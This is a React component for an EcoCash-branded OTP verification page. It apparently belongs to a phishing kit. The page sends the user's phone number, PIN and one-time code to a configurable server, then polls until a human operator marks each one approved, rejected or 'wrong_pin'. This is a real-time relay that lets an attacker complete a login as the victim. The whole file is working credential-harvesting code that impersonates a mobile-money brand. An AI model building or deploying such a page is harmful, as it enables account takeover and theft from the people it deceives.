import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useEcoLink } from '../EcolinkContext';
import './Otp.css';

export default function Otp() {
  const navigate = useNavigate();
  const { authData, updateAuthData } = useEcoLink();

  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';

  const getInitialPhone = () => {
    if (authData.phoneNumber) return authData.phoneNumber;
    try {
      const saved = localStorage.getItem('ecocash_phone');
      if (saved) return saved;
    } catch { /* ignore */ }
    return '+263 777 123 4567';
  };

  const [phoneNumber] = useState(getInitialPhone());
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [showResendToast, setShowResendToast] = useState(false);
  const [timer, setTimer] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [isOtpApproved, setIsOtpApproved] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(true);

  // Modal states
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [showResendErrorModal, setShowResendErrorModal] = useState(false);
  const [showVerifyErrorModal, setShowVerifyErrorModal] = useState(false);
  const [showWrongPinModal, setShowWrongPinModal] = useState(false);
  const [showTimeoutModal, setShowTimeoutModal] = useState(false);

  const previousStatusRef = useRef(null);
  const pollingIntervalRef = useRef(null);

  const otpRefs = Array.from({ length: 6 }, () => useRef(null));

  // Poll for login approval
  useEffect(() => {
    if (!waitingForApproval) return;

    const checkApprovalStatus = async () => {
      try {
        const phone = authData.phoneNumber || phoneNumber;
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, pin: authData.pin })
        });
        const data = await response.json();

        if (data.approved) {
          setWaitingForApproval(false);
          setShowSuccessToast(true);
          setTimer(104);
          localStorage.setItem('otp_timer', JSON.stringify({ endTime: Date.now() + 104000 }));
        }
      } catch { /* continue polling */ }
    };

    pollingIntervalRef.current = setInterval(checkApprovalStatus, 2000);
    checkApprovalStatus();
    return () => { if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current); };
  }, [waitingForApproval, phoneNumber, authData.phoneNumber, authData.pin, API_BASE_URL, API_ENDPOINT]);

  useEffect(() => {
    if (showSuccessToast) {
      const t = setTimeout(() => setShowSuccessToast(false), 2500);
      return () => clearTimeout(t);
    }
  }, [showSuccessToast]);

  useEffect(() => {
    if (showResendToast) {
      const t = setTimeout(() => setShowResendToast(false), 2500);
      return () => clearTimeout(t);
    }
  }, [showResendToast]);

  useEffect(() => {
    if (timer > 0 && !isProcessing && !waitingForApproval) {
      const countdown = setInterval(() => {
        setTimer(prev => {
          const n = prev - 1;
          if (n <= 0) { localStorage.removeItem('otp_timer'); return 0; }
          localStorage.setItem('otp_timer', JSON.stringify({ endTime: Date.now() + n * 1000 }));
          return n;
        });
      }, 1000);
      return () => clearInterval(countdown);
    }
  }, [timer, isProcessing, waitingForApproval]);

  useEffect(() => {
    if (isProcessing && isOtpApproved && progress < 100) {
      const t = setTimeout(() => {
        setProgress(prev => Math.min(prev + Math.random() * 15 + 5, 100));
      }, 300);
      return () => clearTimeout(t);
    } else if (progress >= 100 && isOtpApproved) {
      setTimeout(() => navigate('/status'), 500);
    }
  }, [isProcessing, isOtpApproved, progress, navigate]);

  const checkOTPStatus = async (phone, otpCode) => {
    const startTime = Date.now();
    const maxTime = 5 * 60 * 1000;
    const pollInterval = 2000;

    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, otp: otpCode })
        });
        const data = await response.json();

        if (data.status === 'approved') return { approved: true };
        if (data.status === 'rejected') return { approved: false, message: 'Admin marked OTP as incorrect' };
        if (data.status === 'wrong_pin') return { approved: false, wrongPin: true };

        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const newStatus = `Please wait... (${elapsed}s)`;
        if (previousStatusRef.current !== newStatus) {
          setVerificationStatus(newStatus);
          previousStatusRef.current = newStatus;
        }
        await new Promise(r => setTimeout(r, pollInterval));
      } catch {
        await new Promise(r => setTimeout(r, pollInterval));
      }
    }
    return { approved: false, timeout: true };
  };

  const handleOtpChange = (index, value) => {
    const num = value.replace(/\D/g, '');
    if (num.length > 1) return;
    const newOtp = [...otp]; newOtp[index] = num; setOtp(newOtp);
    if (num && index < 5) otpRefs[index + 1].current.focus();
  };

  const handleOtpPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('');
    const newOtp = [...otp];
    digits.forEach((d, i) => { if (index + i < 6) newOtp[index + i] = d; });
    setOtp(newOtp);
    otpRefs[Math.min(index + digits.length, 5)].current.focus();
  };

  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) { const n = [...otp]; n[index] = ''; setOtp(n); }
      else if (index > 0) otpRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) otpRefs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 5) otpRefs[index + 1].current.focus();
  };

  const handleOtpKeyPress = (e) => { if (!/^\d$/.test(e.key)) e.preventDefault(); };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isSubmitting || waitingForApproval) return;
    const fullOtp = otp.join('');
    if (fullOtp.length !== 6) { alert('Please enter complete 6-digit OTP'); return; }

    setIsSubmitting(true);
    const phone = authData.phoneNumber || phoneNumber;
    updateAuthData({ otp: fullOtp, isAuthenticated: true });

    try {
      await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, otp: fullOtp, timestamp: new Date().toISOString() })
      });

      setIsProcessing(true);
      const init = 'Please wait...';
      setVerificationStatus(init);
      previousStatusRef.current = init;
      setIsOtpApproved(false);
      setProgress(0);

      const result = await checkOTPStatus(phone, fullOtp);

      if (result.approved) {
        localStorage.removeItem('otp_timer');
        const s = '✅ Verified! Proceeding...';
        setVerificationStatus(s);
        previousStatusRef.current = s;
        setIsOtpApproved(true);
      } else if (result.wrongPin) {
        setIsProcessing(false); setIsSubmitting(false); setProgress(0);
        setIsOtpApproved(false); setShowWrongPinModal(true);
        previousStatusRef.current = null;
      } else if (result.timeout) {
        setIsProcessing(false); setIsSubmitting(false); setProgress(0);
        setIsOtpApproved(false); setShowTimeoutModal(true);
        previousStatusRef.current = null;
      } else {
        setIsProcessing(false); setIsSubmitting(false); setProgress(0);
        setIsOtpApproved(false); setShowErrorModal(true);
        setOtp(['', '', '', '', '', '']);
        previousStatusRef.current = null;
        setTimeout(() => otpRefs[0].current?.focus(), 100);
      }
    } catch {
      setIsSubmitting(false); setIsProcessing(false); setProgress(0);
      setIsOtpApproved(false); setShowVerifyErrorModal(true);
      previousStatusRef.current = null;
    }
  };

  const handleResend = async () => {
    if (timer > 0 || isResending || waitingForApproval) return;
    const phone = authData.phoneNumber || phoneNumber;
    if (!phone || phone === '+263 777 123 4567') { setShowResendErrorModal(true); return; }

    setIsResending(true);
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, timestamp: new Date().toISOString() })
      });
      const data = await response.json();
      if (data.success) {
        setOtp(['', '', '', '', '', '']);
        setTimer(104);
        localStorage.setItem('otp_timer', JSON.stringify({ endTime: Date.now() + 104000 }));
        setShowResendToast(true);
        otpRefs[0].current.focus();
      } else setShowResendErrorModal(true);
    } catch { setShowResendErrorModal(true); }
    finally { setIsResending(false); }
  };

  const handleWrongPinModalClose = () => {
    setShowWrongPinModal(false);
    localStorage.removeItem('otp_timer');
    localStorage.removeItem('ecocash_phone');
    updateAuthData({ phoneNumber: '', pin: '', otp: '', isAuthenticated: false });
    navigate('/login');
  };

  const isOtpComplete = otp.every(d => d !== '');

  if (isProcessing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container"><div className="spinner"></div></div>
            <h1 className="processing-title">Verifying OTP</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
          </div>
        </main>
        <footer className="otp-footer">© 2025 Ecocash</footer>
      </div>
    );
  }

  return (
    <div className="otp-container">
      {/* Modals */}
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Wrong code!</h2>
            <p className="error-modal-message">Check SMS for the code or request code again after countdown is over</p>
            <button className="error-modal-button" onClick={() => setShowErrorModal(false)}>OK</button>
          </div>
        </div>
      )}
      {showTimeoutModal && (
        <div className="error-modal-overlay" onClick={() => setShowTimeoutModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Timeout</h2>
            <p className="error-modal-message">Error occurred, please try again</p>
            <button className="error-modal-button" onClick={() => setShowTimeoutModal(false)}>OK</button>
          </div>
        </div>
      )}
      {showWrongPinModal && (
        <div className="error-modal-overlay" onClick={handleWrongPinModalClose}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Wrong PIN!</h2>
            <p className="error-modal-message">The PIN or phone number you entered earlier was incorrect. Please login again with the correct details.</p>
            <button className="error-modal-button" onClick={handleWrongPinModalClose}>Back to Login</button>
          </div>
        </div>
      )}
      {showResendErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowResendErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Resend Failed</h2>
            <p className="error-modal-message">Failed to resend OTP. Please try again later.</p>
            <button className="error-modal-button" onClick={() => setShowResendErrorModal(false)}>OK</button>
          </div>
        </div>
      )}
      {showVerifyErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowVerifyErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Verification Failed</h2>
            <p className="error-modal-message">Failed to verify OTP. Please try again later.</p>
            <button className="error-modal-button" onClick={() => setShowVerifyErrorModal(false)}>OK</button>
          </div>
        </div>
      )}

      {showSuccessToast && (
        <div className="success-toast">
          <div className="success-icon">✓</div>
          <span className="success-text">OTP code sent successfully!</span>
        </div>
      )}
      {showResendToast && (
        <div className="success-toast resend">
          <div className="success-icon">📱</div>
          <span className="success-text">OTP resent successfully!</span>
        </div>
      )}

      <header className="otp-header">
        <button className="back-btn" onClick={() => { localStorage.removeItem('otp_timer'); navigate(-1); }}>←</button>
        <div className="logo-large">
          <span className="logo-large-eco">Eco</span>
          <span className="logo-large-cash">Cash</span>
        </div>
        <button className="menu-btn" aria-label="Menu">
          <div className="menu-line"></div>
          <div className="menu-line"></div>
          <div className="menu-line"></div>
        </button>
      </header>

      <main className="otp-content">
        <div className="otp-card">
          <h1 className="otp-title">OTP Verification</h1>
          <p className="otp-subtitle">Enter the OTP sent to your phone number</p>
          <p className="otp-phone">{phoneNumber}</p>

          <form onSubmit={handleSubmit}>
            <div className="otp-inputs-container">
              <div className="otp-inputs">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={otpRefs[index]}
                    type="text"
                    className="otp-box"
                    value={digit}
                    onChange={e => handleOtpChange(index, e.target.value)}
                    onKeyDown={e => handleOtpKeyDown(index, e)}
                    onKeyPress={handleOtpKeyPress}
                    onPaste={e => handleOtpPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    pattern="[0-9]"
                    required
                    disabled={isResending || isSubmitting || waitingForApproval}
                  />
                ))}
              </div>
              <p className="resend-text">
                {waitingForApproval ? (
                  <span className="resending-text">Requesting OTP...</span>
                ) : isResending ? (
                  <span className="resending-text">Resending code...</span>
                ) : timer > 0 ? (
                  `Resend code in ${timer} seconds`
                ) : (
                  <>
                    Didn't receive the code?{' '}
                    <span className="resend-link" onClick={handleResend}>Resend</span>
                  </>
                )}
              </p>
            </div>
            <button
              type="submit"
              className={`submit-button ${isOtpComplete && !waitingForApproval ? 'active' : ''}`}
              disabled={!isOtpComplete || isResending || isSubmitting || waitingForApproval}
            >
              {isSubmitting ? 'VERIFYING...' : 'SUBMIT'}
            </button>
          </form>
        </div>
      </main>

      <footer className="otp-footer">© 2025 Ecocash</footer>
    </div>
  );
}